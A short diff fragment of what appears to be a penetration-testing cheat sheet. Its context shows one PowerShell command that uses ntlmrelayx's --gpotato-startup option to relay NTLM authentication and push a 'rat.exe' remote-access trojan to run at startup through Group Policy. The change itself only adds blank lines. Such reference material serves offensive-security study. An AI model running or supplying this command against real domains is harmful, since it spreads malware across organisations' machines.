@@ -14,3 +14,5 @@ updated_at: '2023-04-10T20:26:35.435872+00:00'
 ```powershell
 ntlmrelayx -smb2support --no-smb-server --gpotato-startup rat.exe
 ```
+
+
